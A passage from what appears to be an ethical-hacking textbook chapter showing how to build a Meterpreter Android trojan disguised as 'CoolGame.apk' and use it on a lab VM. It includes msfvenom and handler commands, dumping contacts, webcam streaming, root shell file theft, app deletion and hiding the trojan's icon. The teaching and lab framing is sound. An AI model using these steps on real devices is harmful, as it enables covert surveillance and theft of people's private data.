<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
	<head>
		<title>Chapter 9: Hacking Mobile Devices</title>
		<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:af29b7b1-e841-4e64-a1ef-e03d2d2c1d42" name="Adept.expected.resource"/>
	</head>
	<body epub:type="bodymatter chapter">
		<section>
			<header>
				<h1 class="chapter"><span class="ChapterNumber"><span epub:type="pagebreak" id="Page_105" title="105"/>9</span><br/><span class="ChapterTitle">Hacking Mobile Devices</span></h1>
			</header>
			<figure class="opener">
				<img alt="" src="image_fi/book_art/chapterart.png"/>
			</figure>
			<p class="ChapterIntro">In this chapter, we’ll explore the world of mobile device hacking. You’ll build a virtual machine using the world’s most popular mobile operating system, Android. Then you’ll hack into your virtual mobile device with Metasploit and take control of it remotely using Meterpreter, much like you hacked a PC in Chapter 6. You’ll also learn several ways to protect yourself and your family and friends from the growing number of mobile attacks.</p>
			<h2 id="h1-502000c09-0001"><span epub:type="pagebreak" id="Page_106" title="106"/>Creating an Android Phone/Tablet VM</h2>
			<p class="BodyFirst">We want to hack an Android mobile device in a safe, ethical way, so we’ll begin by adding an Android VM in our virtual hacking lab. Follow these steps to download and configure the VM.</p>
			<ol class="decimal">
				<li value="1">Go to <a class="LinkURL" href="https://www.osboxes.org/android-x86/">https://www.osboxes.org/android-x86/</a><em> </em>and scroll down to the Android-x86 8.1-RC1 Oreo section. Select the <b>VirtualBox</b> tab and click the <b>Download</b> button for the 64-bit version.
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="note">
							<h2><span class="NoteHead">NOTE</span></h2>
							<p>
									You can choose a newer version of Android as it becomes available. The screens will look a bit different, and some hacks may not work exactly the way they’re shown here—or at all. Trying different versions will give you extra hacking practice. If the OSBoxes site changes or disappears, check <a class="LinkURL" href="https://www.nostarch.com/go-hck-yourself/">https://www.nostarch.com/go-hck-yourself/</a> for updated links.</p>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="2">Your download should have a <em>.7z</em> file extension. To unzip the file, you’ll need to download and install 7-Zip for Windows, Archiver for Mac, or p7zip-full for Linux. Once you have the required software, unzip the Android VM: on Windows, right-click the file and select <b>7-Zip</b><span class="MenuArrow">▶</span><b>Extract Here</b>; on macOS or Linux, double-click the file. The VM will be extracted into a folder called <em>64bit</em>.</li>
				<li value="3">Open VirtualBox and click <b>New</b> to open the Create Virtual Machine window.</li>
				<li value="4">In the Name and operating system dialog, enter <b>Android 8.1</b> or similar in the Name: text box, select <b>Linux</b> from the Type: drop-down list, and choose <b>Other Linux (64-bit) </b>from the Version: drop-down list. Then click <b>Next</b> on Windows or <b>Continue</b> (on macOS).</li>
				<li value="5">In the Memory size dialog, enter <b>2048</b> in the box to give the VM 2,048MB (2GB) of RAM and click through to the next screen.</li>
				<li value="6">In the Hard disk dialog, choose <b>Use an existing virtual hard disk file</b> and click the Browse icon (the folder with a green arrow). In the pop-up window that appears, click <b>Add</b>. Then find and select the <em>.vdi</em> file inside the <em>64bit</em> folder you unzipped.</li>
				<li value="7">Click through to return to the Hard disk dialog and choose <b>Create</b> to create your VM. Your new Android 8.1 VM should now appear in the list of VMs in VirtualBox, as shown in <a href="#figure9-1" id="figureanchor9-1">Figure 9-1</a>.</li>
				<li value="8">Select the Android VM in the list, go to <b>Settings</b>, and choose the <b>Display</b> tab. In the Graphics Controller: drop-down list, select <b>VBoxSVGA</b>. This changes the display settings so that we’ll be able to see the graphical user interface (GUI) version of our Android smartphone VM.</li>
				<li value="9">Still in the Display tab, make sure the checkbox beside <b>Enable 3D Acceleration</b> is unchecked. (If your VM doesn’t work in a moment, however, you might have to turn on 3D acceleration.)</li>
				<li value="10">Switch to the <b>Network</b> settings tab and choose the NAT network named <b>PublicNAT</b>. This will enable your Android VM to communicate with your Kali VM in your virtual hacking lab.</li>
			</ol>
			<span epub:type="pagebreak" id="Page_107" title="107"/>
			<figure>
				<img alt="f09001" class="" src="image_fi/502000c09/f09001.png"/>
				<figcaption>
					<p><a id="figure9-1">Figure 9-1</a>: We’ve added an Android 8.1 VM to VirtualBox!</p>
				</figcaption>
			</figure>
			<p>
				You’re now ready to fire up your Android VM! It may take a few moments to load the first time (and you may need to restart your VM if the screen stays black for more than a minute or so), but you’ll eventually see an Android device home screen like the one shown in <a href="#figure9-2" id="figureanchor9-2">Figure 9-2</a>.</p>
			<figure>
				<img alt="f09002" class="" src="image_fi/502000c09/f09002.png"/>
				<figcaption>
					<p><a id="figure9-2">Figure 9-2</a>: The home screen on your virtual Android device</p>
				</figcaption>
			</figure>
			<p><span epub:type="pagebreak" id="Page_108" title="108"/>Before you start exploring the VM, go to <b>Input</b><span class="MenuArrow">▶</span><b>Mouse Integration</b> in the Android VM’s menu bar to deselect Mouse Integration. Leaving Mouse Integration on can make it difficult to control the pointer on the Android VM. (The Android VM is made for touch screens, so the mouse can be frustrating to use in Android anyway.) With that done, you’re ready to look around your virtual Android device.</p>
			<p>
				Open the Chrome browser and browse to a web page or open the Contacts app and add a few contacts—do anything you want to try. The Android VM is almost identical to a real Android tablet or phone, except that it can’t make phone calls and it doesn’t have certain sensors like GPS for location services. Remember that you can use the right <span class="KeyCaps">CTRL</span> key (Windows) or left <span class="KeyCaps">COMMAND</span> key (Mac) to regain control of your mouse when you want to leave the Android VM, just as we’ve done with other VMs.</p>
			<h2 id="h1-502000c09-0002">Launching an Android Trojan</h2>
			<p class="BodyFirst">Now we’re ready to create some malware. Just as we did with your Windows VM in Chapter 6, we’ll use a Meterpreter trojan to infect and take over the Android VM. We’ll hide the trojan in a file called <em>CoolGame.apk</em>. Android uses the <em>APK file format</em> to distribute and install mobile apps. Following these steps, you’ll see how easy it is for an attacker to trick an Android user into installing and running an infected app.</p>
			<ol class="decimal">
				<li value="1">Log in to your Kali VM and launch Metasploit.</li>
				<li value="2">At the Metasploit <code>msf6</code> command prompt, type the following command as one long line, substituting your Kali VM’s IP address after <code>LHOST=</code>:
					<pre><code>msf6 &gt; <code class="bold">sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=</code><var class="bold">10.0.9.4</var><code class="bold"> -f raw -o /var/www/html/share/CoolGame.apk</code></code></pre>
					<p class="ListBody">This creates an <code>android/meterpreter/reverse_tcp</code> payload in the form of an APK file and saves it directly to Kali’s shared web folder. Metasploit will respond with a few lines of output, ending with something like the following:</p>
					<pre><code><var>--snip--</var>
Payload size: 10080 bytes
Saved as: /var/www/html/share/CoolGame.apk</code></pre>
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="note">
							<h2><span class="NoteHead">NOTE</span></h2>
							<p>
									If you get an error saying the folder doesn’t exist, enter the command <code>sudo mkdir /var/www/html/share</code> into the Kali terminal to make the directory and then retry the <code>msfvenom</code> command.</p>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="3">Turn on the Apache web server service so you can download the file from your Android VM:
					<pre><code>msf6 &gt; <code class="bold">sudo service apache2 start</code></code></pre>
			</li>
				<li value="4"><span epub:type="pagebreak" id="Page_109" title="109"/>To verify that your Kali web server is active, open Firefox and go to <em>localhost/share</em>. You should see <em>CoolGame.apk</em> in the file listing.</li>
				<li value="5">Enter these four commands in the Metasploit terminal window to set up the listener for handling incoming Meterpreter connections:
					<pre><code>msf6 &gt; <code class="bold">use exploit/multi/handler</code>
msf6 exploit(multi/handler) &gt; <code class="bold">set PAYLOAD android/meterpreter/reverse_tcp</code> PAYLOAD =&gt; android/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; <code class="bold">set LHOST </code><var class="bold">10.0.9.4</var>
LHOST =&gt; 10.0.9.4
msf6 exploit(multi/handler) &gt; <code class="bold">exploit</code></code></pre>
			</li>
			</ol>
			<p>Metasploit is now listening for incoming connections!</p>
			<h2 id="h1-502000c09-0003">Infecting the Android VM</h2>
			<p class="BodyFirst">Now we’ll download the trojan app and deliberately infect your virtual Android device. Switch back to your Android VM and follow these steps:</p>
			<ol class="decimal">
				<li value="1">Open the Chrome browser and enter your Kali VM’s IP address in the address bar, followed by <code class="bold">/share/</code>, like <var class="bold">10.0.9.4</var><code class="bold">/share/</code>, as shown in <a href="#figure9-3" id="figureanchor9-3">Figure 9-3</a>.
					<figure>
						<img alt="f09003" class="" src="image_fi/502000c09/f09003.png"/>
						<figcaption>
							<p><a id="figure9-3">Figure 9-3</a>: Navigate to your Kali VM’s <em>share</em> folder from your Android VM’s Chrome browser to find your <em>CoolGame.apk</em> trojan app ready to download and install.</p>
						</figcaption>
					</figure>
					</li>
				<li value="2"><span epub:type="pagebreak" id="Page_110" title="110"/>Click the APK file to download it. Android will pop up a message the first time you try to download a file, asking you to give Chrome permission to access file storage on your device. Click <b>Update Permissions</b>, then <b>Allow</b>.
					<figure class="graphic">
						<img alt="g09001" src="image_fi/502000c09/g09001.png"/>
					</figure>
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="box">
							<h2>Turning Off Play Protect Security</h2>
							<p class="BoxBodyFirst">Just as Windows has the firewall and Windows Defender virus protection, Android has a few safety controls. If you have any trouble downloading or installing the APK file, or if you installed a newer version of the Android VM, you need to turn off Google Play Protect. Go to <b>Settings</b> (click in the lower third of the home screen and drag to push the screen up to reveal Settings), search for “Play Protect,” and select <b>Security</b><span class="MenuArrow">▶</span><b>Google Play Protect</b>. Click the gear-shaped <b>Settings</b> icon in the top-right corner, then switch off the security settings, as shown in <a href="#figure9-4" id="figureanchor9-4">Figure 9-4</a>.</p>
							<figure>
								<img alt="f09004" src="image_fi/502000c09/f09004.png"/>
								<figcaption>
									<p><a id="figure9-4">Figure 9-4</a>: Turning off Google Play Protect security</p>
								</figcaption>
							</figure>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="3">Click your APK file again to download it. Chrome will usually show you the warning “This type of file can harm your device.” Click <b>OK</b> to download the file anyway.</li>
				<li value="4">Click the down arrow in the upper-left corner of your Android VM’s screen, and you’ll see the Download Manager as shown in <a href="#figure9-5" id="figureanchor9-5">Figure 9-5</a>. Click the name of your APK file in the list to install the app.</li>
				<li value="5">Android will pop up yet another window telling you “your phone is not allowed to install unknown apps from this source.” Click <b>Settings</b>, then slide the toggle switch to turn on the <b>Allow from this source</b> setting. <span epub:type="pagebreak" id="Page_111" title="111"/>
				<figure><img alt="f09005" class="" src="image_fi/502000c09/f09005.png"/><figcaption>
							<p><a id="figure9-5">Figure 9-5</a>: Accessing the Download Manager</p>
						</figcaption>
					</figure>
					</li>
				<li value="6">Click the back button (left arrow) in the black band at the bottom of your Android screen, and you’ll see a list of permissions the Meterpreter trojan app, called MainActivity, is requesting: settings, pictures, videos, contacts, GPS, mic, call logs, text messages, SD card access . . . virtually every permission your smartphone can allow! Click <b>Next</b> at the bottom right of the permission window and then click <b>Install</b>. If you get a Google Play Protect warning, click <b>Install Anyway</b>.
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="note">
							<h2><span class="NoteHead">WARNING</span></h2>
							<p>	When you’re installing a real app on your actual device, you should look carefully at this permissions list instead of blindly accepting it. If a game asks for access to your microphone or SMS text messages, for example, delete it instead of installing it.</p>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="7">Click the home button (the circle in the middle) at the bottom of your Android VM’s screen. Then click and drag the screen up to reveal your installed apps. Click the MainActivity icon to start the trojan app.</li>
				<li value="8">Switch back to your Kali VM, and you’ll see a new session has opened in Meterpreter.</li>
			</ol>
			<p>Our trojan on the Android device has called home to Kali and is waiting for commands. Let’s see what we can do once we take control.</p>
			<h2 id="h1-502000c09-0004">Controlling the Android VM</h2>
			<p class="BodyFirst">The threat from malicious mobile apps is just as real as the threat of malware on PCs. If you install malware on your smartphone, an attacker will have access to <em>a lot</em> of sensitive information: every picture and video you’ve ever taken, all your contacts, your call and text message history, your GPS location history, every web search you’ve done and YouTube video you’ve watched, and a portable camera and microphone an attacker could use to spy on you at any time—that’s what you carry with you everywhere you go.</p>
			<p>
				To see exactly how much a malicious hacker can do with an app like the Meterpreter trojan, enter <code class="bold">help</code> in the Meterpreter terminal window. You’ll <span epub:type="pagebreak" id="Page_112" title="112"/>see a list of all available Meterpreter commands. In addition to those we saw in Chapter 6 when we hacked a Windows PC, there are two sections of commands just for Android devices:</p>
			<pre><code>Android Commands
================ Command           Description -------           ----------- activity_start    Start an Android activity from a Uri string check_root        Check if device is rooted dump_calllog      Get call log dump_contacts     Get contacts list dump_sms          Get sms messages geolocate         Get current lat-long using geolocation hide_app_icon     Hide the app icon from the launcher interval_collect  Manage interval collection capabilities send_sms          Sends SMS from target session set_audio_mode    Set Ringer Mode sqlite_query      Query a SQLite database from storage wakelock          Enable/Disable Wakelock wlan_geolocate    Get current lat-long using WLAN information
Application Controller Commands
=============================== Command        Description -------        ----------- app_install    Request to install apk file app_list       List installed apps in the device app_run        Start Main Activity for package name app_uninstall  Request to uninstall application</code></pre>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">NOTE</span></h2>
					<p>
							To get help for a particular command, enter the command name, followed by a space, and then <code>-h</code> (short for <em>help</em>).</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<p>The first thing we’ll do to take control of the Android device is prevent it from going to sleep. Enter this command at the Meterpreter prompt:</p>
			<pre><code>meterpreter &gt; <b>wakelock -w</b></code></pre>
			<p>
				Meterpreter will reply <code>Wakelock was acquired</code>, and if your Android device had gone to sleep or changed to a black screen before, the screen will wake up and the device will remain awake until you release the wakelock.</p>
			<p>It’s easiest to run the Meterpreter commands and see their effect if you can display both the Android and Kali VMs on your screen at the same time. (This approach is also useful to see what the user sees while an attacker is hacking their device.) If you have dual monitors, put Kali on one monitor and Android on the other. If you have a single screen, try to fit Kali alongside Android so you can see both as you work.</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="box">
					<h2><span epub:type="pagebreak" id="Page_113" title="113"/>Reconnecting with Meterpreter</h2>
					<p class="BoxBodyFirst">You’ll lose the Meterpreter session connection every now and then, especially when you close either the Kali or Android VM. Here’s how to restart your Meterpreter session:</p>
					<ol>
						<li value="1">If your Kali <code>msf</code><code>6</code> prompt still shows <code>msf</code><code>6</code><code> exploit(multi/handler) &gt;</code> from a previous session, re-enter the command <code>exploit</code> to start listening again.</li>
						<li value="2">Go to the home screen in your Android VM, swipe up to reveal the list of installed apps, and click the MainActivity icon to start the Meterpreter trojan app.</li>
						<li value="3">If you’ve closed Metasploit entirely, run the MainActivity app in Android and enter the following four commands at the Kali <code>msf</code><code>6</code> prompt to connect a new session (remember to use your Kali VM’s IP address in the third command):
							<pre><code>msf6 &gt; <code>use exploit/multi/handler</code>
msf6 exploit(multi/handler) &gt; <code>set PAYLOAD android/meterpreter/reverse_tcp </code>
msf6 exploit(multi/handler) &gt; <code>set LHOST </code><var class="bold">10.0.9.4</var>
msf6 exploit(multi/handler) &gt; <code>exploit</code></code></pre>
			</li>
					</ol>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<h3 id="h2-502000c09-0001">Running Apps</h3>
			<p class="BodyFirst">Once an attacker has taken control of a mobile device, they can remotely launch any app they want. To see how it works, let’s list the apps the user has installed on their device. In the Meterpreter terminal window, enter the command <code class="bold">app_list</code>. Android will list every app installed on the smartphone, including both the name that appears on the app icon and the package Uniform Resource Identifier (URI) string for that app. The <em>URI string</em> is how we identify the various resources on an Android device. For example, you might see the YouTube app listed as follows:</p>
			<pre><code>  YouTube  com.google.android.youtube  false  true</code></pre>
			<p>
				The final two entries on the line tell you whether the app is running and whether it’s a system app installed by the operating system. Here, the <code>false</code> value tells us that the YouTube app is not currently running, and the <code>true</code> value indicates that it is a standard app installed as part of the Android operating system.</p>
			<p>
				Now that we know YouTube is installed on the Android device, we can launch it from Meterpreter using the <code>app_run</code> command and YouTube’s package URI string. Enter the following:</p>
			<pre><code>meterpreter &gt; <b>app_run com.google.android.youtube</b></code></pre>
			<p><span epub:type="pagebreak" id="Page_114" title="114"/>You’ll see the YouTube app open in your Android VM! Switch back to your Android VM and search for the video “Bryson Payne TED Talk.” The YouTube app on your Android VM will pull up the video (though you probably won’t be able to hear audio through the VM, because VirtualBox’s drivers don’t always work for smartphone and tablet operating systems).</p>
			<p>
				You can run <em>any app</em> on the infected smartphone or tablet this way, without the user’s permission or interaction at all. Try running several more apps, such as Settings (<code>com.android.settings</code>) or the Phone app (<code>com.android.dialer</code>).</p>
			<p>You can also request permission to uninstall an app, but the user will be alerted. Try this command:</p>
			<pre><code>meterpreter &gt; <b>app_uninstall com.google.android.gm</b></code></pre>
			<p>
				Your Android VM will show a pop-up window asking if you want to uninstall Gmail, as shown in <a href="#figure9-6" id="figureanchor9-6">Figure 9-6</a>. Click <b>Cancel</b> to keep the Gmail app on your device. The security settings on newer Android devices keep the Meterpreter trojan from uninstalling the app. However, with superuser access (which we’ll get in “Stealing Files and Snooping Around in Logs” on page <span class="xref" itemid="xref_target_117">117</span>), we could delete the app’s data and even its main program files without the user’s knowledge.</p>
			<figure>
				<img alt="f09006" class="" src="image_fi/502000c09/f09006.png"/>
				<figcaption>
					<p><a id="figure9-6">Figure 9-6</a>: Android asks the user’s permission before uninstalling an app.</p>
				</figcaption>
			</figure>
			<p>Before we move on to more devious hacks, let’s run one last app, Contacts:</p>
			<pre><code>meterpreter &gt; <b>app_run com.android.contacts</b></code></pre>
			<p>The Contacts app will open in your Android VM. While it’s open, we’ll add a contact so we can steal it in Meterpreter later.</p>
			<ol class="decimal">
				<li value="1">Click the Add Contact icon (a red circle with a plus sign, +) in the lower-right of your Contacts screen in Android. 
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="note">
							<h2><span class="NoteHead">WARNING</span></h2>
							<p>
									Do <em>not</em> click the Add Account icon on that screen. You don’t want to connect this hacked Android VM to your <em>real</em> Google account.</p>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="2">Android will ask you to add an account to access your Google contacts. Click <b>Cancel</b>. (You don’t need to log in to your Google account to add contacts to your virtual smartphone.)</li>
				<li value="3"><span epub:type="pagebreak" id="Page_115" title="115"/>The Create New Contact window will appear. Enter your name, a fake phone number or two, and a fake email address, as shown in <a href="#figure9-7" id="figureanchor9-7">Figure 9-7</a>.</li>
				<li value="4">Click <b>Save</b> to store the new contact on your Android VM. Click the back arrow at the bottom of your Android screen if you’d like to add more contacts.</li>
			</ol>
			<figure>
				<img alt="f09007" class="" src="image_fi/502000c09/f09007.png"/>
				<figcaption>
					<p><a id="figure9-7">Figure 9-7</a>: Using the Contacts app to add a new contact with fake information</p>
				</figcaption>
			</figure>
			<h3 id="h2-502000c09-0002">Accessing Contacts</h3>
			<p class="BodyFirst">Meterpreter has several commands for accessing the sensitive data we store in our smartphones. Run <code class="bold">help</code> in the Meterpreter console in Kali and look for several commands that begin with <code>dump</code>:</p>
			<pre><code><code>    </code>dump_calllog      Get call log dump_contacts     Get contacts list dump_sms          Get sms messages</code></pre>
			<p>Since our Android VM isn’t a physical Android device, we can’t make calls or receive text messages, but we did add a contact in the previous section. Let’s steal it now.</p>
			<ol class="decimal">
				<li value="1">Run the <code class="bold">dump_contacts</code> command in Meterpreter:
					<pre><code><code>meterpreter &gt;</code> <code class="bold">dump_contacts</code> [*] Fetching 1 contact into list
[*] Contacts list saved to: contacts_dump_<em>20210927103858</em>.txt</code></pre>
					<p class="ListBody"><span epub:type="pagebreak" id="Page_116" title="116"/>Meterpreter will respond with the number of contacts it found, along with the filename where it saved those contacts on your Kali machine.</p>
					</li>
				<li value="2">Open a second terminal window in your Kali VM and enter <code class="bold">cd</code> to change into your home directory. Then enter the command <code class="bold">ls con*</code> to list any contact files Meterpreter dumped there:
					<pre><code>kali@kali:~# <code class="bold">ls con*</code>
contacts_dump_<em>20210927103858</em>.txt<var> </var></code></pre>
					<p class="ListBody">You’ll see a <em>.txt</em> file named <em>contacts_dump_</em> followed by a timestamp (year, month, day, and time in numeric format).</p>
					</li>
				<li value="3">Enter <code class="bold">cat con</code> and press <b>TAB</b> to autocomplete the contacts filename, and then press <b>ENTER</b> to display the contents of the file:
					<pre><code>kali@kali:~# <code class="bold">cat contacts_dump_</code><em>20210927103858</em><code class="bold">.txt</code> <var>--snip--</var>
#1
Name: Bryson Payne
Number: 404-555-1212
Email: brysonpayne@myuniversity.edu</code></pre>
			</li>
			</ol>
			<p>An attacker can see the full contact information of every person listed in your smartphone’s Contacts app, in addition to reading your text messages and seeing every phone call you’ve made recently!</p>
			<h3 id="h2-502000c09-0003">Spying Through the Camera</h3>
			<p class="BodyFirst">If an attacker gains remote control of your smartphone, they can hijack the device’s camera and/or microphone. As we’ll see, this kind of spying is disturbingly easy.</p>
			<ol class="decimal">
				<li value="1">If you’ve got a webcam, connect it to the Android VM by going to the menu bar of your VM under <b>Devices</b><span class="MenuArrow">▶</span><b>Webcams</b> and selecting its name.</li>
				<li value="2">After attaching the webcam, reboot your Android VM (select <b>Machine</b><span class="MenuArrow">▶</span><b>Reset</b> and click the <b>reset</b> button). Then rerun the trojan by clicking the MainActivity app.</li>
				<li value="3">In Metasploit, press <b>ENTER</b> after the error <code>Meterpreter session closed</code> and then enter the command <code class="bold">exploit</code>.</li>
				<li value="4">When the new Meterpreter session starts, enter the command <code class="bold">webcam_list</code> to see your camera listed:
					<pre><code>meterpreter &gt; <code class="bold">webcam_list</code>
1: Back Camera</code></pre>
			</li>
				<li value="5">Use the command <code>webcam_stream</code> to view a live feed from the camera:
					<pre><code>meterpreter &gt; <code class="bold">webcam_stream</code></code></pre>
			</li>
			</ol>
			<p><span epub:type="pagebreak" id="Page_117" title="117"/>The webcam will begin streaming video (slowly) to your Kali VM through the Firefox browser, until you close the web browser video stream and press <span class="KeyCaps">CTRL</span>-C (on Windows) or <span class="KeyCaps">CONTROL</span>-C (on macOS) in the Meterpreter terminal to stop the stream.</p>
			<p>
				As you can see, an attacker can stream video from your smartphone’s webcam if your device is ever compromised through an exploit like the one we built, just like they can access your laptop or desktop webcam. But unlike with your computer’s webcam, you probably take your smartphone with you <em>everywhere</em>, as do your friends and family. Most of us don’t want to cover the camera on our smartphone like we do with our laptop, so it’s even more important to be careful which apps we install on our smartphones and what permissions we give them.</p>
			<h3 id="h2-502000c09-0004">Stealing Files and Snooping Around in Logs</h3>
			<p class="BodyFirst">Just as we did in our Windows 10 hack, we can upload and download files from the Android device’s storage using the upload and download commands. We can even access protected, sensitive files using the device’s shell terminal if the user gives us superuser access.</p>
			<ol class="decimal">
				<li value="1">Enter <code class="bold">shell</code> in Meterpreter to enter the Android terminal shell:
					<pre><code>meterpreter &gt; <code class="bold">shell</code>
Process 1 created.
Channel 1 created.</code></pre>
			</li>
				<li value="2">The Android shell doesn’t show a prompt at the beginning of the line, so your cursor will be on a blank line. Enter the commands <code class="bold">cd /</code> and <code class="bold">ls</code> to change directories to the root <em>/</em> directory and list all folders on the device:
					<pre><code><code class="bold">cd /</code><code class="bold">ls</code>
acct
bugreports
cache
charger
config
d
data<var>--snip--</var></code></pre>
					<p class="ListBody">The <em>data</em> folder contains a treasure trove of user data, including the user’s YouTube, browser, and other app history files. Remember when we ran the YouTube app and searched for “Bryson Payne TED Talk”? If an app stores a log or history file with recent search results, we can access those files as long as the user grants administrator or superuser privileges to the app.</p>
					</li>
				<li value="3"><span epub:type="pagebreak" id="Page_118" title="118"/>Enter <code class="bold">su</code> into the Meterpeter Android shell to request superuser access.
					<pre><code><code class="bold">su</code></code></pre>
			</li>
				<li value="4">Immediately in the Android VM, you’ll see the permissions window pop up, as shown in <a href="#figure9-8" id="figureanchor9-8">Figure 9-8</a>. Click <b>Allow</b> to give Meterpreter superuser access.
					<figure>
						<img alt="f09008" class="" src="image_fi/502000c09/f09008.png"/>
						<figcaption>
							<p><a id="figure9-8">Figure 9-8</a>: Giving Meterpreter superuser access</p>
						</figcaption>
					</figure>
					</li>
				<li value="5">Change directories into <em>/data/data/com.google.android.youtube</em> and list the directory contents with <code class="bold">ls</code>:
					<pre><code><code class="bold">cd /data/data/com.google.android.youtube</code><code class="bold">ls</code>
cache
code_cache
databases
files
no_backup
shared_prefs</code></pre>
			</li>
				<li value="6">The <em>databases</em> folder contains various files used by the app, including one that stores the YouTube search history. To find that file, enter the commands <code class="bold">cd databases</code> and <code class="bold">ls</code>. 
					<pre><code><code class="bold">cd database</code><code class="bold">ls</code></code></pre>
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="box">
							<h2><span epub:type="pagebreak" id="Page_119" title="119"/>Deleting the Gmail App</h2>
							<p class="BoxBodyFirst">Superuser access allows you to remove crucial app files and data, so you can make your Android VM unusable if you delete the wrong files. To make an app unusable and delete its data, you simply remove its files from the <em>/system/app</em> and <em>/data/data</em> directories. For example, to kill Gmail on your Android VM, enter the following two lines into the Android shell after you’ve given the MainActivity app superuser permissions:</p>
							<pre><code><code>rm -r /system/app/Gmail2</code><code>rm -r /data/data/com.google.android.gm</code></code></pre>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="7">In the short list of files that appears, you’ll find the <em>history.db</em> file. Run the command <code class="bold">cat history.db</code> to view the device’s YouTube Search history.
					<pre><code><code class="bold">cat history.db</code>
����h�!##�mat 3@tablesuggestionssuggestionsCREATE TABLE suggestions (_id INTEGER PRIMARY KEY,display1 TEXT UNIQUE ON CONFLICT REPLACE,display2 TEXT,query TEXT,date LONG)5I#indexsqlite_autoindex_suggestions_1suggestionW--ctableandroid_metada��677bryson payne ted talkbryson payne ted talkl0�/cale TEXT)
��7	bryson payne ted talk</code></pre>
					<p class="ListBody">Because this is a special database-formatted file, not all of the characters are printable, but look at the last line or two—our search for “Bryson Payne TED Talk” is viewable in plaintext! If you search for other videos on YouTube and then rerun that last command (<code>cat history.db</code>), you’ll see new results added to the file.</p>
					</li>
				<li value="8">Now we’ll download the YouTube search history file to the Kali VM. First, we need to copy it to the Metasploit trojan app’s <em>files</em> folder: 
					<pre><code><code class="bold">cp /data/data/com.google.android.youtube/databases/history.db /data/data/com.metasploit.stage/files</code></code></pre>
			</li>
				<li value="9">Next, we need to grant access to the copied file:
					<pre><code><code class="bold">chmod 666 /data/data/com.metasploit.stage/files/history.db</code></code></pre>
			</li>
				<li value="10">Exit the Android shell by pressing <span class="KeyCaps">CTRL</span>-C (<span class="KeyCaps">CONTROL</span>-C on a Mac). Meterpreter will respond with a prompt asking if you want to terminate the <em>channel</em>, or shell connection. Enter <code class="bold">y</code>.
					<pre><code>^C
Terminate channel 1? [y/N] <code class="bold">y</code></code></pre>
			</li>
				<li value="11"><span epub:type="pagebreak" id="Page_120" title="120"/>You’ll now drop back into a regular Meterpreter prompt, where you can download the YouTube history file to your Kali VM’s home (<em>/home/kali/</em>) folder:
					<pre><code>meterpreter &gt; <code class="bold">download history.db</code></code></pre>
			</li>
				<li value="12">In a separate terminal window, type <code class="bold">ls</code> to confirm that the <em>history.db</em> file downloaded successfully. Then enter <code class="bold">cat history.db</code> and you’ll see the same file contents you saw in the Android shell, with the user’s YouTube search history in plaintext.</li>
			</ol>
			<p>Malicious hackers can use this technique to save a record of your YouTube search history. If you were a forensic data analyst working for the FBI or on a company’s security team, however, you could use the same technique to discover whether a criminal had watched YouTube videos to learn how to make a bomb or commit another crime.</p>
			<h3 id="h2-502000c09-0005">Turning Off the Ringer and More</h3>
			<p class="BodyFirst">You can change settings with Meterpreter and prevent the user from being able to change them back. For example, you can turn off the ringer on the Android VM by entering the following command in Meterpreter:</p>
			<pre><code>meterpreter &gt; <b>set_audio_mode -m 0</b>
[*] Ringer mode was changed to 0!</code></pre>
			<p>
				In your Android VM, swipe up on your home screen and select <b>Settings</b>. Search for “ring” and click <b>Ring volume</b> to open the Sound settings. The Ring volume has been turned off, as shown in <a href="#figure9-9" id="figureanchor9-9">Figure 9-9</a>.</p>
			<figure>
				<img alt="f09009" class="" src="image_fi/502000c09/f09009.png"/>
				<figcaption>
					<p><a id="figure9-9">Figure 9-9</a>: When we turn off the ring volume in Meterpreter, the user can’t turn it back on from the Settings screen!</p>
				</figcaption>
			</figure>
			<p>Try to slide the Ring volume slider to the right or left. You won’t be able to! Meterpreter has locked the ring volume off by turning on a “Do not disturb” mode (much like sliding the mute switch on some smartphones). The user will have to find “Do not disturb” under Settings and turn it off to regain control of their smartphone’s ring volume.</p>
			<p><span epub:type="pagebreak" id="Page_121" title="121"/>There’s another change we can make that the user can’t override. You might have already thought to yourself, <em>If I saw an app I didn’t recognize, like MainActivity, I’d probably delete it</em>. So let’s hide the MainActivity app icon to make it harder for the user to delete our trojan app.</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">WARNING</span></h2>
					<p>
							Hiding the MainActivity app icon makes it harder to reinfect the device. The next time you want to practice mobile hacking, you’ll have to reinstall the <em>CoolGame.apk </em>file you downloaded in the previous chapter instead of clicking the MainActivity app. If you’re not okay with that, skip the rest of this section.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<p>In Meterpreter, enter the following command to hide the MainActivity trojan app from the user’s list of installed apps:</p>
			<pre><code>meterpreter &gt; <b>hide_app_icon</b>
[*] Activity MainActivity was hidden</code></pre>
			<p>
